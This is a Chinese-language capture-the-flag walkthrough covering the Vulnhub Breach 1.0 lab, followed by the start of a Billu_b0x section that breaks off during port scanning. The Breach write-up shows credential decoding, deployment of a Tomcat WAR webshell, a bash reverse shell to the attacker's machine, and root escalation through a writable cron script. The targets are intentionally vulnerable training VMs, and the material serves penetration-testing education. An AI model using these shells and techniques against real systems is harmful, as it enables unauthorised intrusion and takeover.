# Vulnhub 渗透测试练习目录

1. **Breach 1.0**
2. **Billu_b0x**
3. **Bulldog 1**
4. **Acid**
5. **LazysysAdmin-1**
6. **Freshly**
7. **FristiLeaks v1.3**
8. **The Ether**
9. **Zico2**
10. **Quaoar**
11. **SickOs 1.1**
12. **BSides-Vancouver-2018-Workshop**
13. **Kioptrix 1**
14. **Zico2 (重复)**
15. **Kioptrix 3**
16. **Kioptrix 4**

## Vulnhub靶场题解 - 红日安全团队

### Vulnhub简介
Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用。大部分环境是预先设计好的虚拟机镜像文件，这些镜像包含多种漏洞，需要使用 VMware 或 VirtualBox 运行。每个镜像都有破解的目标，通常是 Boot2root 类型，即从启动虚机到获取操作系统的 root 权限并查看 flag。网址：[https://www.vulnhub.com](https://www.vulnhub.com)

## 第一节 Breach 1.0

### 靶机信息
- **下载链接**:
  [https://download.vulnhub.com/breach/Breach-1.0.zip](https://download.vulnhub.com/breach/Breach-1.0.zip)

### 靶机说明
Breach 1.0 是一个难度为初级到中级的 Boot2Root/CTF 挑战。VM 虚机配置有静态 IP 地址（192.168.110.140），需要将虚拟机网卡设置为主机模式（host-only）。感谢 Knightmare 和 rastamouse 的测试和反馈。作者期待大家写出文章，特别是通过非预期的方式获取 root 权限。

### 目标
- **Boot to root**: 获得 root 权限，查看 flag。

### 运行环境
- **靶机**: 网络连接方式设置为主机模式（host-only），静态 IP 是 192.168.110.140。
- **攻击机**: 同网段下有 Windows 攻击机（物理机），IP 地址：192.168.110.220，安装有 Nmap、Burp Suite、Wireshark、Sqlmap、nc、Python 2.7、JDK、DirBuster、AWVS、Nessus 等渗透工具。也可以使用 Kali Linux 攻击机。

### 信息收集
#### 端口服务识别
- 启动 Breach 1.0 虚拟机，由于 IP 已知，使用 nmap 扫描端口，并做服务识别和深度扫描（加 -A 参数），扫描结果保存到 txt 文件，命令：
  ```bash
  nmap -v -A 192.168.110.140 -oN Breach.txt
  ```
- 发现端口几乎全开放了，显然是有问题，虚拟机对端口扫描做了一些防护措施。直接访问 80 端口，进入 web 首页：[http://192.168.110.140/](http://192.168.110.140/)

### 漏洞挖掘
#### 0x01: 查看首页源码，解码得到密码
1. 查看首页源码，发现提示：`Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo`，这是一串 base64 编码。
2. 将其复制到 Burp Suite Decoder 进行 base64 解码，解密后发现还是 base64 编码，继续 base64 解码，得到 `pgibbons:damnitfeel$goodtobeagang$ta`

#### 0x02: 登录 CMS，查看邮件，下载包含 SSL 证书的密钥库 keystore 文件
1. 点击首页的图片，进入 initech.html。
2. 点击 initech.html 左边的 Employee portal 进入到 [http://192.168.110.140/impresscms/user.php](http://192.168.110.140/impresscms/user.php)，这是一个 impresscms 登录页。
   - 使用之前两次 base64 解码得到的密码登录 impresscms：
     - 用户名：`pgibbons`
     - 密码：`damnitfeel$goodtobeagang$ta`
3. 在 exploit-db.com 查找 impress cms 漏洞，发现 ImpressCMS 1.3.9 SQL 注入漏洞：[https://www.exploit-db.com/exploits/39737/](https://www.exploit-db.com/exploits/39737/)，可注入页面为 `/modules/profile/admin/field.php`，但该页面目前没有权限访问，无法进行注入。
4. 注意左边的收件箱 Inbox 显示有 3 封邮件，依次打开查看：
   - 第 1 封邮件，主要内容：让你的团队只能向管理门户发布任何敏感的内容。我的密码非常安全，发自 ImpressCMS Admin Bill。
   - 第 2 封邮件，主要内容：Michael 采购了 IDS/IPS。
   - 第 3 封邮件，主要内容：有一个 Peter 的 SSL 证书被保存在 192.168.110.140/.keystore。
5. 访问 [http://192.168.110.140/.keystore](http://192.168.110.140/.keystore) 下载包含 SSL 证书的密钥库 keystore 文件，keystore 是存储公私密钥的一种文件格式。

#### 0x03: 导入流量抓包文件、SSL 证书到 Wireshark
1. 依次访问左边的菜单树，点击每个菜单栏：
   - content 链接了一张图片 troll.gif。
   - 点击 profile 会进入目录浏览，但都没发现可利用漏洞，继续浏览每个网页。
2. 点击 View Account 菜单进入界面，再依次点击页面的 Content，会弹出一行链接 Content SSL implementation test capture，点击链接。
3. 进入 [http://192.168.110.140/impresscms/modules/content/content.php?content_id=1](http://192.168.110.140/impresscms/modules/content/content.php?content_id=1) 页面，可以看到一个名为 `_SSL_test_phase1.pcap` 的 Wireshark 流量包文件，下载它。
   - 该页面有重要的提示信息：这个 pcap 文件是有红色团队的重新攻击产生的，但是不能读取文件。而且 They told me the alias, storepassword and keypassword are all set to 'tomcat' 别名、Keystore 密码、key 密码都设置成 tomcat。
4. Windows 攻击机安装有 JDK，到 JDK 目录下找到 keytool.exe 工具：路径 `C:\Program Files\Java\jre1.8.0_121\bin\keytool.exe`。
   - 将 keystore 放到 C 盘根目录，查看 keystore 这个密钥库里面的所有证书，命令：
     ```bash
     keytool -list -keystore c:\keystore
     ```
   - 输入密钥库口令 `tomcat`。
5. 从密钥库导出 .p12 证书，将 keystore 拷贝到 keytool 目录，导出名为 `tomcatkeystore.p12` 的证书，命令：
   ```bash
   keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat
   ```
6. 将 .p12 证书导入 Wireshark：
   - .p12 证书存储在 C 盘根目录，将证书导入 Wireshark：在 Wireshark 中打开 `_SSL_test_phase1.pcap` 流量包文件，选择菜单：编辑--首选项--Protocols--SSL，点击右边的 Edit。
   - 输入：`192.168.110.140 8443 http` 点击选择证书文件 输入密码 `tomcat`。

#### 0x04: 从流量包文件中得到 Tomcat 后台 URL 和密码
1. 导入证书后，HTTPS 流量已经被解密，查看每个 HTTP 流量包：
   - 发现从 192.168.110.129 到 192.168.110.140 的攻击流量包，其中有 cmd 命令马执行了 id 命令，攻击者上传了两张图片，疑似图片马，但是命令马无法直接访问，需要登录 Tomcat 后台。
2. 获得 Tomcat 后台登录地址和用户名密码：
   - 继续观察流量包，发现一个 Unauthorized 的认证包，该 request 和 response 包含了 Tomcat 后台的登录地址：`https://192.168.110.140:8443/_M@nag3Me/html`。
   - 发现包含登录用户名密码的数据包，采用 HTTP Basic 认证，认证数据包为：`Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC`。
   - 这是 base64 编码的用户名密码，将 `dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC` 复制到 Burp Suite Decoder 进行解码，得到 Tomcat 登录用户名密码：
     - 用户名：`tomcat`
     - 密码：`Tt\5D8F(#!*u=G)4m7zB`

#### 获取 Shell
#### 0x05: 登录 Tomcat 后台 get shell
1. 登录 Tomcat 后台。
2. Tomcat 后台 get shell 有标准姿势，准备好 JSP 版本的各种马，这里有 cmd 命令小马、菜刀马、JspSpy 大马，将其打成 caidao.zip 压缩包，再将 zip 压缩包扩展名改为 caidao.war，将 war 包上传部署即可。
3. 在 WAR file to deploy 中将 war 包上传：
   - 上传后在目录中找到上传的目录 `/caidao`，已上传 JSP 木马文件就在这个目录下。
4. 使用中国菜刀连接 `https://192.168.110.140:8443/caidao/caidao.jsp`。
5. 使用菜刀命令行连接，执行 `id;pwd` 命令成功。
6. 发现的问题：上传的菜刀马，一会儿就会消失，文件被删除，需要重新上传 war 包才能够继续使用菜刀，主机可能有杀软或者杀 Web Shell 工具。解决方法：bash 反弹一个 shell 出来。

#### 提升权限
#### 0x06: 查看系统用户，发现 MySQL root 密码
1. 查看当前系统用户，找 id 为 1000 以后的用户 `cat /etc/passwd`。
   - 发现两个值得关注的用户：`milton` 和 `blumbergh`。
2. 在菜刀里面找到网页根目录，默认是在 tomcat 目录，找到网页部署目录 `/var/www/5446/`。
3. 该目录下发现两个奇怪的 PHP 文件，命名非常长且无规律 `fe4db1f7bc038d60776dcb66ab3404d5.php` 和 `0d93f85c5061c44cdffeb8381b2772fd.php`，使用菜刀下载下来打开查看：
   - 这是 MySQL 数据库连接文件，使用 MySQL 的 root 账号连接数据库，密码为空。
4. 因为菜刀马总是被删除，所以反弹 shell 到 nc：在菜刀 CMD 命令行反弹一个 shell 到 Windows 攻击机的 nc，命令：
   ```bash
   echo "bash -i >& /dev/tcp/192.168.110.220/4444 0>&1" | bash
   ```
   - nc 接收反弹 shell 成功。
5. 连接 MySQL 数据库，查看 MySQL 用户，这里输入 MySQL 命令后一直没有回显，直到输入 exit 退出 MySQL 登录后，查询回显才出来，命令：
   ```sql
   mysql -u root -p
   use mysql;
   select user, password from user;
   exit
   ```
   - 得到 `milton` 用户的密码哈希：`6450d89bd3aff1d893b85d3ad65d2ec2`。
   - 到 [https://www.somd5.com/](https://www.somd5.com/) 解密，得到用户 `milton` 的明文密码：`thelaststraw`。

#### 0x07: 提权到用户 milton 和 blumbergh
1. 无法执行 su 命令，显示需要一个终端，之前都遇到这个问题，通过 Python 解决：
   ```python
   python -c 'import pty;pty.spawn("/bin/bash")'
   ```
2. 提权到用户 milton：
   ```bash
   su - milton
   ```
   - 密码：`thelaststraw`
   - 查看 `milton` 用户 home 目录下的 `some_script.sh` 文件，没有可利用的信息。
3. 查看系统内核版本，命令 `uname -a` 和 `cat /etc/issue`：
   - 系统内核版本为：Linux Breach 4.2.0-27-generic，不存在 Ubuntu 本地提权漏洞。存在本地提权漏洞内核版本是：Linux Kernel 3.13.0。
4. 再使用 tee 命令将 `shell.txt` 内容输出到 `tidyup.sh`：
   ```bash
   cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
   ```
   - 查看 `tidyup.sh` 文件写入成功：
     ```bash
     cat /usr/share/cleanup/tidyup.sh
     ```
5. nc 监听等待反弹 shell，查看权限是 root，flag 是一张图片，将图片拷贝到 home 目录。
6. 查看一下 crontab 计划任务，发现果然有每 3 分钟执行 `tidyup.sh` 清理脚本的任务。
7. 使用之前上传的 JSP 大马 JspSpy 将 `flair.jpg` 下载到 Windows。
8. 查看 flag：`I NEED TO TALK ABOUT YOUR FLAIR` 游戏通关。

### 思路总结
主要突破点：
1. 从网页源码和图片字符中解密出 CMS 和 Tomcat 的账号、密码。
2. 导入 SSL 证书到 Wireshark 中解密经过 SSL 加密的流量，获得 Tomcat 后台登录 URL 和账号密码。
3. Tomcat 后台 get shell 姿势要熟练。
4. 提权：找到两个账号的密码，发现可以 root 权限执行的 tee 命令和 `tidyup.sh` 清理脚本，通过计划任务反弹 root shell。

难点和踩到的坑：
1. 使用 keytool 导出 SSL 证书：这是非常规渗透知识，需要查阅原理和工具使用，耗费时间较多。
2. Tomcat 后台 get shell 后，已上传的菜刀马总是被杀，每次传上去过不了几分钟没了，当时以为该系统安装了杀毒软件或 Web Shell 清理工具，实际是因为主机 `tidyup.sh` 清理脚本，每 3 分钟清理一次。反弹出一个 shell 就可以持续使用 shell 了。
3. 连接 MySQL 执行命令，没有回显。菜刀执行命令超时，nc 中只有 exit 退出时才回显，当时打算放弃了，才 exit 退出，结果退出才有回显，发现了 `milton` 账号的密码哈希。山重水复疑无路，柳暗花明又一村。
4. 花费较多时间进行两次账号切换，再反弹 root shell 提权。发现和利用 `tidyup.sh` 需要较多时间。
5. 通过 crontab 的计划任务，反弹 root shell 的方式，在真实渗透测试中是常见的，比如 Redis 的 root 空口令挖矿，可以 SSH 证书连接，也可以写 root crontab 反弹，但在 Vulnhub 中第一次遇到，对初学者有难度。

## 第二节 Billu_b0x

### 靶机信息
- **下载链接**:
  [https://download.vulnhub.com/billu/Billu_b0x.zip](https://download.vulnhub.com/billu/Billu_b0x.zip)

### 靶机说明
虚拟机难度中等，使用 Ubuntu（32 位），其他软件包有：
- PHP
- Apache
- MySQL

### 目标
- **Boot to root**: 从 Web 应用程序进入虚拟机，并获得 root 权限。

### 运行环境
- **靶机**: 使用 VMWare 打开虚机，网络连接方式设置为 net，靶机自动获取 IP。
- **攻击机**: 同网段下有 Windows 攻击机，安装有 Nmap、Burp Suite、Sqlmap、nc、Python 2.7、DirBuster、AWVS、Nessus 等渗透工具，Kali 攻击机，主要用 Windows 攻击机完成实验。

### 信息收集
#### IP 发现
- 启动 Billu_b0x 虚拟机，由于虚机网络设置为 net 模式，使用 Nmap 扫描 VMware Network Adapter VMnet8 网卡的 NAT 网段 C 段 IP，即可找到虚机 IP，命令：
  ```bash
  nmap -sP 192.168.64.1/24
  ```
- 获得靶机 IP：192.168.64.161

#### 端口和服务识别
- 使用 Nmap 扫描 1-65535 全端口，并做服务识别和深度扫描（加 -A 参数），扫描结果保存到 txt 文件，命令：
  ```bash
  nmap -p1-65535 -A 192.168.64.161 -oN billu.txt
  ```
- 发现目标主机端口和服务如下：
  - TCP 22: SSH OpenSSH 5.9p1